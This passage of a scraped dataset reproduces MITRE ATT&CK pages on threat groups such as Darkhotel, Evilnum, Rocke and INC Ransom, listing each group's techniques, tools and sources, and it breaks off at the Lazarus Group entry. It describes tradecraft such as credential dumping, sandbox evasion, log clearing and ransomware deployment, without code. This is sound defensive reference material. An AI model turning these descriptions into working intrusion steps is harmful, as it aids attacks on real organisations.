Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Encrypted Channel: Symmetric Cryptography, Hijack Execution Flow: DLL, Indicator Removal: File Deletion, Ingress Tool Transfer, Obfuscated Files or Information: Encrypted/Encoded File, System Binary Proxy Execution: Rundll32 S0142 StreamEx [7] Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, File and Directory Discovery, Modify Registry, Obfuscated Files or Information, Process Discovery, Software Discovery: Security Software Discovery, System Binary Proxy Execution: Rundll32, System Information Discovery S0057 Tasklist [1] Process Discovery, Software Discovery: Security Software Discovery, System Service Discovery References Alperovitch, D. (2014, July 7). Deep in Thought: Chinese Targeting of National Security Think Tanks. Retrieved November 12, 2014. ThreatConnect Research Team. (2015, February 27). The Anthem Hack: All Roads Lead to China. Retrieved January 26, 2016. RSA Incident Response. (2014, January). RSA Incident Response Emerging Threat Profile: Shell Crew. Retrieved January 14, 2016. DiMaggio, J.. (2015, August 6). The Black Vine cyberespionage group. Retrieved January 26, 2016. Scott, J. and Spaniel, D. (2016, July 28). ICIT Brief - China\u2019s Espionage Dynasty: Economic Death by a Thousand Cuts. Retrieved June 7, 2018. RYANJ. (2014, February 20). Mo\u2019 Shells Mo\u2019 Problems \u2013 Deep Panda Web Shells. Retrieved September 16, 2015. Cylance SPEAR Team. (2017, February 9). Shell Crew Variants Continue to Fly Under Big AV\u2019s Radar. Retrieved February 15, 2017. "
},
{
"id": 112,
"title": "Darkhotel, DUBNIUM, Zigzag Hail, Group G0012",
"path": "/groups/G0012/index.html",
"content": " Darkhotel Darkhotel is a suspected South Korean threat group that has targeted victims primarily in East Asia since at least 2004. The group's name is based on cyber espionage operations conducted via hotel Internet networks against traveling executives and other select guests. Darkhotel has also conducted spearphishing campaigns and infected victims through peer-to-peer and file sharing networks.[1][2][3] ID: G0012 \u24d8 Associated Groups: DUBNIUM, Zigzag Hail Contributors: Harry Kim, CODEMIZE Version: 3.0 Created: 31 May 2017 Last Modified: 08 January 2024 Version Permalink Live Version Associated Group Descriptions Name Description DUBNIUM [3][4][5][6] Zigzag Hail [7] Techniques Used Domain ID Name Use Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Darkhotel has been known to establish persistence by adding programs to the Run Registry key.[1] Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell Darkhotel has dropped an mspaint.lnk shortcut to disk which launches a shell script that downloads and executes a file.[2] Enterprise T1140 Deobfuscate/Decode Files or Information Darkhotel has decrypted strings and imports using RC4 during execution.[2][6] Enterprise T1189 Drive-by Compromise Darkhotel used embedded iframes on hotel login portals to redirect selected victims to download malware.[1] Enterprise T1573 .001 Encrypted Channel: Symmetric Cryptography Darkhotel has used AES-256 and 3DES for C2 communications.[6] Enterprise T1203 Exploitation for Client Execution Darkhotel has exploited Adobe Flash vulnerability CVE-2015-8651 for execution.[4] Enterprise T1083 File and Directory Discovery Darkhotel has used malware that searched for files with specific patterns.[6] Enterprise T1105 Ingress Tool Transfer Darkhotel has used first-stage payloads that download additional malware from C2 servers.[4] Enterprise T1056 .001 Input Capture: Keylogging Darkhotel has used a keylogger.[1] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location Darkhotel has used malware that is disguised as a Secure Shell (SSH) tool.[4] Enterprise T1027 .013 Obfuscated Files or Information: Encrypted/Encoded File Darkhotel has obfuscated code using RC4, XOR, and RSA.[2][6] Enterprise T1566 .001 Phishing: Spearphishing Attachment Darkhotel has sent spearphishing emails with malicious RAR and .LNK attachments.[2][6] Enterprise T1057 Process Discovery Darkhotel malware can collect a list of running processes on a system.[2] Enterprise T1091 Replication Through Removable Media Darkhotel's selective infector modifies executables stored on removable media as a method of spreading across computers.[1] Enterprise T1518 .001 Software Discovery: Security Software Discovery Darkhotel has searched for anti-malware strings and anti-virus processes running on the system.[2][4] Enterprise T1553 .002 Subvert Trust Controls: Code Signing Darkhotel has used code-signing certificates on its malware that are either forged due to weak keys or stolen. Darkhotel has also stolen certificates and signed backdoors and downloaders with them.[1][2] Enterprise T1082 System Information Discovery Darkhotel has collected the hostname, OS version, service pack version, and the processor architecture from the victim\u2019s machine.[2][6] Enterprise T1016 System Network Configuration Discovery Darkhotel has collected the IP address and network adapter information from the victim\u2019s machine.[2][6] Enterprise T1124 System Time Discovery Darkhotel malware can obtain system time from a compromised host.[8] Enterprise T1080 Taint Shared Content Darkhotel used a virus that propagates by infecting executables stored on shared drives.[1] Enterprise T1204 .002 User Execution: Malicious File Darkhotel has sent spearphishing emails in an attempt to lure users into clicking on a malicious attachments.[2][6] Enterprise T1497 Virtualization/Sandbox Evasion Darkhotel malware has employed just-in-time decryption of strings to evade sandbox detection.[8] .001 System Checks Darkhotel malware has used a series of checks to determine if it's being analyzed; checks include the length of executable names, if a filename ends with .Md5.exe, and if the program is executed from the root of the C:\\ drive, as well as checks for sandbox-related libraries.[8][4] .002 User Activity Based Checks Darkhotel has used malware that repeatedly checks the mouse cursor position to determine if a real user is on the system.[8] References Kaspersky Lab's Global Research and Analysis Team. (2014, November). The Darkhotel APT A Story of Unusual Hospitality. Retrieved November 12, 2014. Kaspersky Lab's Global Research & Analysis Team. (2015, August 10). Darkhotel's attacks in 2015. Retrieved November 2, 2018. Microsoft . (2020, September 29). Microsoft Digital Defense Report FY20. Retrieved April 21, 2021. Microsoft. (2016, June 9). Reverse-engineering DUBNIUM. Retrieved March 31, 2021. Microsoft. (2016, June 20). Reverse-engineering DUBNIUM\u2019s Flash-targeting exploit. Retrieved March 31, 2021. Microsoft. (2016, July 14). Reverse engineering DUBNIUM \u2013 Stage 2 payload analysis . Retrieved March 31, 2021. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Arunpreet Singh, Clemens Kolbitsch. (2015, November 5). Defeating Darkhotel Just-In-Time Decryption. Retrieved April 15, 2021. "
},
{
"id": 113,
"title": "Evilnum, Group G0120",
"path": "/groups/G0120/index.html",
"content": " Evilnum Evilnum is a financially motivated threat group that has been active since at least 2018.[1] ID: G0120 Version: 1.0 Created: 22 January 2021 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1548 .002 Abuse Elevation Control Mechanism: Bypass User Account Control Evilnum has used PowerShell to bypass UAC.[1] Enterprise T1059 .007 Command and Scripting Interpreter: JavaScript Evilnum has used malicious JavaScript files on the victim's machine.[1] Enterprise T1555 Credentials from Password Stores Evilnum can collect email credentials from victims.[1] Enterprise T1574 .001 Hijack Execution Flow: DLL Evilnum has used the malware variant, TerraTV, to load a malicious DLL placed in the TeamViewer directory, instead of the original Windows DLL located in a system folder.[1] Enterprise T1070 .004 Indicator Removal: File Deletion Evilnum has deleted files used during infection.[1] Enterprise T1105 Ingress Tool Transfer Evilnum can deploy additional components or tools as needed.[1] Enterprise T1566 .002 Phishing: Spearphishing Link Evilnum has sent spearphishing emails containing a link to a zip file hosted on Google Drive.[1] Enterprise T1219 .002 Remote Access Tools: Remote Desktop Software EVILNUM has used the malware variant, TerraTV, to run a legitimate TeamViewer application to connect to compromised machines.[1] Enterprise T1539 Steal Web Session Cookie Evilnum can steal cookies and session information from browsers.[1] Enterprise T1204 .001 User Execution: Malicious Link Evilnum has sent spearphishing emails designed to trick the recipient into opening malicious shortcut links which downloads a .LNK file.[1] Enterprise T1497 .001 Virtualization/Sandbox Evasion: System Checks Evilnum has used a component called TerraLoader to check certain hardware and file information to detect sandboxed environments. [1] Software ID Name References Techniques S0568 EVILNUM [2] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Exfiltration Over C2 Channel, Indicator Removal, Indicator Removal: Timestomp, Ingress Tool Transfer, Modify Registry, Software Discovery: Security Software Discovery, Steal Web Session Cookie, System Binary Proxy Execution: Rundll32, System Binary Proxy Execution: Regsvr32, System Information Discovery, System Owner/User Discovery, Web Service: One-Way Communication, Windows Management Instrumentation S0349 LaZagne [1] Credentials from Password Stores: Windows Credential Manager, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Credentials from Password Stores: Keychain, OS Credential Dumping: LSA Secrets, OS Credential Dumping: /etc/passwd and /etc/shadow, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Cached Domain Credentials, OS Credential Dumping: Proc Filesystem, Unsecured Credentials: Credentials In Files S0284 More_eggs [1] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Indicator Removal: File Deletion, Ingress Tool Transfer, Obfuscated Files or Information: Encrypted/Encoded File, Software Discovery: Security Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Regsvr32, System Information Discovery, System Network Configuration Discovery: Internet Connection Discovery, System Network Configuration Discovery, System Owner/User Discovery References Porolli, M. (2020, July 9). More evil: A deep look at Evilnum and its toolset. Retrieved January 22, 2021. Adamitis, D. (2020, May 6). Phantom in the Command Shell. Retrieved November 17, 2024. "
},
{
"id": 114,
"title": "Whitefly, Group G0107",
"path": "/groups/G0107/index.html",
"content": " Whitefly Whitefly is a cyber espionage group that has been operating since at least 2017. The group has targeted organizations based mostly in Singapore across a wide variety of sectors, and is primarily interested in stealing large amounts of sensitive information. The group has been linked to an attack against Singapore\u2019s largest public health organization, SingHealth.[1] ID: G0107 Version: 1.2 Created: 26 May 2020 Last Modified: 10 April 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1059 Command and Scripting Interpreter Whitefly has used a simple remote shell tool that will call back to the C2 server and wait for commands.[1] Enterprise T1068 Exploitation for Privilege Escalation Whitefly has used an open-source tool to exploit a known Windows privilege escalation vulnerability (CVE-2016-0051) on unpatched computers.[1] Enterprise T1574 .001 Hijack Execution Flow: DLL Whitefly has used search order hijacking to run the loader Vcrodat.[1] Enterprise T1105 Ingress Tool Transfer Whitefly has the ability to download additional tools from the C2.[1] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location Whitefly has named the malicious DLL the same name as DLLs belonging to legitimate software from various security vendors.[1] Enterprise T1027 .013 Obfuscated Files or Information: Encrypted/Encoded File Whitefly has encrypted the payload used for C2.[1] Enterprise T1588 .002 Obtain Capabilities: Tool Whitefly has obtained and used tools such as Mimikatz.[1] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory Whitefly has used Mimikatz to obtain credentials.[1] Enterprise T1204 .002 User Execution: Malicious File Whitefly has used malicious .exe or .dll files disguised as documents or images.[1] Software ID Name References Techniques S0002 Mimikatz [1] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket References Symantec. (2019, March 6). Whitefly: Espionage Group has Singapore in Its Sights. Retrieved May 26, 2020. "
},
{
"id": 115,
"title": "Rocke, Group G0106",
"path": "/groups/G0106/index.html",
"content": " Rocke Rocke is an alleged Chinese-speaking adversary whose primary objective appeared to be cryptojacking, or stealing victim system resources for the purposes of mining cryptocurrency. The name Rocke comes from the email address \"rocke@live.cn\" used to create the wallet which held collected cryptocurrency. Researchers have detected overlaps between Rocke and the Iron Cybercrime Group, though this attribution has not been confirmed.[1] ID: G0106 Version: 1.0 Created: 26 May 2020 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1071 Application Layer Protocol Rocke issued wget requests from infected systems to the C2.[1] .001 Web Protocols Rocke has executed wget and curl commands to Pastebin over the HTTPS protocol.[2] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Rocke's miner has created UPX-packed files in the Windows Start Menu Folder.[1] Enterprise T1037 Boot or Logon Initialization Scripts Rocke has installed an \"init.d\" startup script to maintain persistence.[2] Enterprise T1059 .004 Command and Scripting Interpreter: Unix Shell Rocke used shell scripts to run commands which would obtain persistence and execute the cryptocurrency mining malware.[1] .006 Command and Scripting Interpreter: Python Rocke has used Python-based malware to install and spread their coinminer.[2] Enterprise T1543 .002 Create or Modify System Process: Systemd Service Rocke has installed a systemd service script to maintain persistence.[2] Enterprise T1140 Deobfuscate/Decode Files or Information Rocke has extracted tar.gz files after downloading them from a C2 server.[1] Enterprise T1190 Exploit Public-Facing Application Rocke exploited Apache Struts, Oracle WebLogic (CVE-2017-10271), and Adobe ColdFusion (CVE-2017-3066) vulnerabilities to deliver malware.[1][3] Enterprise T1222 .002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification Rocke has changed file permissions of files so they could not be modified.[2] Enterprise T1564 .001 Hide Artifacts: Hidden Files and Directories Rocke downloaded a file \"libprocesshider\", which could hide files on the target system.[1][3] Enterprise T1574 .006 Hijack Execution Flow: Dynamic Linker Hijacking Rocke has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.[2] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools Rocke used scripts which detected and uninstalled antivirus software.[1][3] .004 Impair Defenses: Disable or Modify System Firewall Rocke used scripts which killed processes and added firewall rules to block traffic related to other cryptominers.[1] Enterprise T1070 .002 Indicator Removal: Clear Linux or Mac System Logs Rocke has cleared log files within the /var/log/ folder.[2] .004 Indicator Removal: File Deletion Rocke has deleted files on infected machines.[2] .006 Indicator Removal: Timestomp Rocke has changed the time stamp of certain files.[2] Enterprise T1105 Ingress Tool Transfer Rocke used malware to download additional malicious files to the target system.[1] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location Rocke has used shell scripts which download mining executables and saves them with the filename \"java\".[1] Enterprise T1046 Network Service Discovery Rocke conducted scanning for exposed TCP port 7001 as well as SSH and Redis servers.[1][2] Enterprise T1571 Non-Standard Port Rocke's miner connects to a C2 server using port 51640.[2] Enterprise T1027 Obfuscated Files or Information Rocke has modified UPX headers after packing files to break unpackers.[2] .002 Software Packing Rocke's miner has created UPX-packed files in the Windows Start Menu Folder.[1][3][2] .004 Compile After Delivery Rocke has compiled malware, delivered to victims as .c files, with the GNU Compiler Collection (GCC).[2] Enterprise T1057 Process Discovery Rocke can detect a running process's PID on the infected machine.[2] Enterprise T1055 .002 Process Injection: Portable Executable Injection Rocke's miner, \"TermsHost.exe\", evaded defenses by injecting itself into Windows processes, including Notepad.exe.[1] Enterprise T1021 .004 Remote Services: SSH Rocke has spread its coinminer via SSH.[2] Enterprise T1018 Remote System Discovery Rocke has looked for IP addresses in the known_hosts file on the infected system and attempted to SSH into them.[1] Enterprise T1496 .001 Resource Hijacking: Compute Hijacking Rocke has distributed cryptomining malware.[1][3] Enterprise T1014 Rootkit Rocke has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.[2] Enterprise T1053 .003 Scheduled Task/Job: Cron Rocke installed a cron job that downloaded and executed files from the C2.[1][3][2] Enterprise T1518 .001 Software Discovery: Security Software Discovery Rocke used scripts which detected and uninstalled antivirus software.[1][3] Enterprise T1082 System Information Discovery Rocke has used uname -m to collect the name and information about the infected system's kernel.[2] Enterprise T1552 .004 Unsecured Credentials: Private Keys Rocke has used SSH private keys on the infected machine to spread its coinminer throughout a network.[2] Enterprise T1102 Web Service Rocke has used Pastebin, Gitee, and GitLab for Command and Control.[2][1] .001 Dead Drop Resolver Rocke has used Pastebin to check the version of beaconing malware and redirect to another Pastebin hosting updated malware.[2] References Liebenberg, D.. (2018, August 30). Rocke: The Champion of Monero Miners. Retrieved May 26, 2020. Anomali Labs. (2019, March 15). Rocke Evolves Its Arsenal With a New Malware Family Written in Golang. Retrieved April 24, 2019. Xingyu, J.. (2019, January 17). Malware Used by Rocke Group Evolves to Evade Detection by Cloud Security Products. Retrieved May 26, 2020. "
},
{
"id": 116,
"title": "INC Ransom, GOLD IONIC, Group G1032",
"path": "/groups/G1032/index.html",
"content": " INC Ransom INC Ransom is a ransomware and data extortion threat group associated with the deployment of INC Ransomware that has been active since at least July 2023. INC Ransom has targeted organizations worldwide most commonly in the industrial, healthcare, and education sectors in the US and Europe.[1][2][3][4] ID: G1032 \u24d8 Associated Groups: GOLD IONIC Contributors: Matt Anderson, @\u200cnosecurething, Huntress Version: 1.0 Created: 06 June 2024 Last Modified: 28 October 2024 Version Permalink Live Version Associated Group Descriptions Name Description GOLD IONIC [3] Techniques Used Domain ID Name Use Enterprise T1087 .002 Account Discovery: Domain Account INC Ransom has scanned for domain admin accounts in compromised environments.[5] Enterprise T1071 Application Layer Protocol INC Ransom has used valid accounts over RDP to connect to targeted systems.[6] Enterprise T1560 .001 Archive Collected Data: Archive via Utility INC Ransom has used 7-Zip and WinRAR to archive collected data prior to exfiltration.[6][3][5][7] Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell INC Ransom has used cmd.exe to launch malicious payloads.[6] Enterprise T1486 Data Encrypted for Impact INC Ransom has used INC Ransomware to encrypt victim's data.[4][6][1][3][2][5] Enterprise T1074 Data Staged INC Ransom has staged data on compromised hosts prior to exfiltration.[6][5] Enterprise T1190 Exploit Public-Facing Application INC Ransom has exploited known vulnerabilities including CVE-2023-3519 in Citrix NetScaler for initial access.[5][4] Enterprise T1657 Financial Theft INC Ransom has stolen and encrypted victim's data in order to extort payment for keeping it private or decrypting it.[2][1][3][5][4] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools INC Ransom can use SystemSettingsAdminFlows.exe, a native Windows utility, to disable Windows Defender.[7] Enterprise T1070 .004 Indicator Removal: File Deletion INC Ransom has uninstalled tools from compromised endpoints after use.[7] Enterprise T1105 Ingress Tool Transfer INC Ransom has downloaded tools to compromised servers including Advanced IP Scanner. [6][7] Enterprise T1570 Lateral Tool Transfer INC Ransom has used a rapid succession of copy commands to install a file encryption executable across multiple endpoints within compromised infrastructure.[6][3] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location INC Ransom has named a PsExec executable winupd to mimic a legitimate Windows update file.[6][5] Enterprise T1046 Network Service Discovery INC Ransom has used NETSCAN.EXE for internal reconnaissance.[5][4] Enterprise T1135 Network Share Discovery INC Ransom has used Internet Explorer to view folders on other systems.[6] Enterprise T1588 .002 Obtain Capabilities: Tool INC Ransom has acquired and used several tools including MegaSync, AnyDesk, esentutl and PsExec.[2][6][5][7][4] Enterprise T1069 .002 Permission Groups Discovery: Domain Groups INC Ransom has enumerated domain groups on targeted hosts.[6] Enterprise T1566 Phishing INC Ransom has used phishing to gain initial access.[5][4] Enterprise T1219 Remote Access Tools INC Ransom has used AnyDesk and PuTTY on compromised systems.[6][5][7][4] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol INC Ransom has used RDP to move laterally.[2][6][5][7] Enterprise T1049 System Network Connections Discovery INC Ransom has used RDP to test network connections.[5] Enterprise T1569 .002 System Services: Service Execution INC Ransom has run a file encryption executable via Service Control Manager/7045;winupd,%SystemRoot%\\winupd.exe,user mode service,demand start,LocalSystem.[6] Enterprise T1537 Transfer Data to Cloud Account INC Ransom has used Megasync to exfiltrate data to the cloud.[3] Enterprise T1078 Valid Accounts INC Ransom has used compromised valid accounts for access to victim environments.[2][6][5][7] Enterprise T1047 Windows Management Instrumentation INC Ransom has used WMIC to deploy ransomware.[2][6][5] Software ID Name References Techniques S0552 AdFind [3] Account Discovery: Domain Account, Domain Trust Discovery, Permission Groups Discovery: Domain Groups, Remote System Discovery, System Network Configuration Discovery S0404 esentutl [5][4] Data from Local System, Direct Volume Access, Hide Artifacts: NTFS File Attributes, Ingress Tool Transfer, Lateral Tool Transfer, OS Credential Dumping: NTDS S1139 INC Ransomware [2][3] Data Encrypted for Impact, Defacement: Internal Defacement, Deobfuscate/Decode Files or Information, Device Driver Discovery, File and Directory Discovery, Inhibit System Recovery, Lateral Tool Transfer, Native API, Network Share Discovery, Peripheral Device Discovery, Phishing, Process Discovery, Service Stop, System Information Discovery, Windows Management Instrumentation S0039 Net [7] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0359 Nltest [6] Domain Trust Discovery, Remote System Discovery, System Network Configuration Discovery S0029 PsExec [2][6][3][5] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S1040 Rclone [7] Archive Collected Data: Archive via Utility, Data Transfer Size Limits, Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol, Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Exfiltration Over Web Service: Exfiltration to Cloud Storage, File and Directory Discovery S0183 Tor [3][5][4] Encrypted Channel: Asymmetric Cryptography, Proxy: Multi-hop Proxy References Toulas, B. (2024, March 27). INC Ransom threatens to leak 3TB of NHS Scotland stolen data. Retrieved June 5, 2024. Cybereason Security Research Team. (2023, November 20). Threat Alert: INC Ransomware. Retrieved June 5, 2024. Counter Threat Unit Research Team. (2024, April 15). GOLD IONIC DEPLOYS INC RANSOMWARE. Retrieved June 5, 2024. SentinelOne. (n.d.). What Is Inc. Ransomware?. Retrieved June 5, 2024. SOCRadar. (2024, January 24). Dark Web Profile: INC Ransom. Retrieved June 5, 2024. Team Huntress. (2023, August 11). Investigating New INC Ransom Group Activity. Retrieved June 5, 2024. Carvey, H. (2024, May 1). LOLBin to INC Ransomware. Retrieved June 5, 2024. "
},
{
"id": 117,
"title": "Lotus Blossom, DRAGONFISH, Spring Dragon, RADIUM, Raspberry Typhoon, Bilbug, Thrip, Group G0030",
"path": "/groups/G0030/index.html",
"content": " Lotus Blossom Lotus Blossom is a long-standing threat group largely targeting various entities in Asia since at least 2009. In addition to government and related targets, Lotus Blossom has also targeted entities such as digital certificate issuers.[1][2][3] ID: G0030 \u24d8 Associated Groups: DRAGONFISH, Spring Dragon, RADIUM, Raspberry Typhoon, Bilbug, Thrip Version: 4.0 Created: 31 May 2017 Last Modified: 04 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description DRAGONFISH [4] Spring Dragon [5][4] RADIUM [6] Raspberry Typhoon [6] Bilbug [2] Thrip [3] Techniques Used Domain ID Name Use Enterprise T1134 Access Token Manipulation Lotus Blossom has retrieved process tokens for processes to adjust the privileges of the launch process or other items.[3] Enterprise T1087 .001 Account Discovery: Local Account Lotus Blossom has used commands such as net to profile local system users.[3] .002 Account Discovery: Domain Account Lotus Blossom has used net commands and tools such as AdFind to profile domain accounts associated with victim machines and make Active Directory queries.[3][2] Enterprise T1560 .001 Archive Collected Data: Archive via Utility Lotus Blossom has used WinRAR for compressing data in RAR format.[3][2] .003 Archive Collected Data: Archive via Custom Method Lotus Blossom has used custom tools to compress and archive data on victim systems.[3] Enterprise T1543 .003 Create or Modify System Process: Windows Service Lotus Blossom has configured tools such as Sagerunex to run as Windows services.[3] Enterprise T1074 .001 Data Staged: Local Data Staging Lotus Blossom has locally staged compressed and archived data for follow-on exfiltration.[3] Enterprise T1482 Domain Trust Discovery Lotus Blossom has used tools such as AdFind to make Active Directory queries.[2] Enterprise T1083 File and Directory Discovery Lotus Blossom has used commands such as dir to examine the local filesystem of victim machines.[3] Enterprise T1112 Modify Registry Lotus Blossom has installed tools such as Sagerunex by writing them to the Windows registry.[3] Enterprise T1046 Network Service Discovery Lotus Blossom has used port scanners to enumerate services on remote hosts.[2] Enterprise T1588 .002 Obtain Capabilities: Tool Lotus Blossom has used publicly-available tools such as a Python-based cookie stealer for Chrome browsers, Impacket, and the Venom proxy tool.[3] Enterprise T1090 .001 Proxy: Internal Proxy Lotus Blossom has used publicly available tools such as the Venom proxy tool to proxy traffic out of victim environments.[3] .003 Proxy: Multi-hop Proxy Lotus Blossom has used tools such as the publicly available HTran tool for proxying traffic in victim environments.[3] Enterprise T1012 Query Registry Lotus Blossom has run commands such as reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\[service name]\\Parameters to verify if installed implants are running as a service.[3] Enterprise T1018 Remote System Discovery Lotus Blossom has used Ping to identify remote systems.[2] Enterprise T1539 Steal Web Session Cookie Lotus Blossom has used publicly-available tools to steal cookies from browsers such as Chrome.[3] Enterprise T1016 System Network Configuration Discovery Lotus Blossom has used commands such as ipconfig and netstat to gather network information on compromised hosts.[3] .001 Internet Connection Discovery Lotus Blossom has performed checks to determine if a victim machine is able to access the Internet.[3] Enterprise T1049 System Network Connections Discovery Lotus Blossom has used commands such as netstat to identify system network connections.[3] Enterprise T1047 Windows Management Instrumentation Lotus Blossom has used WMI to enable lateral movement.[3] Software ID Name References Techniques S0552 AdFind Lotus Blossom has used AdFind to query Active Directory in victim environments.[2] Account Discovery: Domain Account, Domain Trust Discovery, Permission Groups Discovery: Domain Groups, Remote System Discovery, System Network Configuration Discovery S0160 certutil Lotus Blossom has used certutil during operations.[2] Archive Collected Data: Archive via Utility, Deobfuscate/Decode Files or Information, Ingress Tool Transfer, Subvert Trust Controls: Install Root Certificate S0081 Elise Lotus Blossom has used Elise.[5][4] Account Discovery: Local Account, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data Staged: Local Data Staging, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Indicator Removal: Timestomp, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information: Encrypted/Encoded File, Process Discovery, Process Injection: Dynamic-link Library Injection, System Binary Proxy Execution: Rundll32, System Information Discovery, System Network Configuration Discovery, System Service Discovery S0082 Emissary Lotus Blossom has used Emissary.[7][8] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Encrypted Channel: Symmetric Cryptography, Group Policy Discovery, Ingress Tool Transfer, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Binary Padding, Permission Groups Discovery: Local Groups, Process Injection: Dynamic-link Library Injection, System Binary Proxy Execution: Rundll32, System Information Discovery, System Network Configuration Discovery, System Service Discovery S1211 Hannotog Hannotog is a backdoor associated with Lotus Blossom operations.[2] Automated Exfiltration, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Impair Defenses: Disable or Modify System Firewall, Ingress Tool Transfer, Non-Standard Port, Service Stop S0357 Impacket Lotus Blossom has used Impacket during operations.[3] Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Lateral Tool Transfer, Network Sniffing, OS Credential Dumping: NTDS, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSA Secrets, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Ccache Files, System Services: Service Execution, Windows Management Instrumentation S0590 NBTscan Lotus Blossom has used NBTscan during operations.[2] Network Service Discovery, Network Sniffing, Remote System Discovery, System Network Configuration Discovery, System Owner/User Discovery S0097 Ping Lotus Blossom has used Ping to verify connectivity to remote hosts.[2] Remote System Discovery S1210 Sagerunex Lotus Blossom is the exclusive user of Sagerunex, and has employed variants of this in operations since 2016.[2][3] Access Token Manipulation, Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Utility, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Execution Guardrails, Exfiltration Over C2 Channel, Native API, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Software Packing, Process Discovery, Process Injection: Dynamic-link Library Injection, Proxy, System Information Discovery, System Network Configuration Discovery, Web Service: One-Way Communication, Web Service: Bidirectional Communication References Falcone, R., et al.. (2015, June 16). Operation Lotus Blossom. Retrieved February 15, 2016. Symntec Threat Hunter Team. (2022, November 12). Billbug: State-sponsored Actor Targets Cert Authority, Government Agencies in Multiple Asian Countries. Retrieved March 15, 2025. Joey Chen, Cisco Talos. (2025, February 27). Lotus Blossom espionage group targets multiple industries with different versions of Sagerunex and hacking tools. Retrieved March 15, 2025. Accenture Security. (2018, January 27). DRAGONFISH DELIVERS NEW FORM OF ELISE MALWARE TARGETING ASEAN DEFENCE MINISTERS\u2019 MEETING AND ASSOCIATES. Retrieved November 17, 2024. Baumgartner, K.. (2015, June 17). The Spring Dragon APT. Retrieved February 15, 2016. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Falcone, R. and Miller-Osborn, J.. (2015, December 18). Attack on French Diplomat Linked to Operation Lotus Blossom. Retrieved February 15, 2016. Falcone, R. and Miller-Osborn, J. (2016, February 3). Emissary Trojan Changelog: Did Operation Lotus Blossom Cause It to Evolve?. Retrieved February 15, 2016. "
},
{
"id": 118,
"title": "Lazarus Group, Labyrinth Chollima, HIDDEN COBRA, Guardians of Peace, ZINC, NICKEL ACADEMY, Diamond Sleet, Group G0032",
"path": "/groups/G0032/index.html",
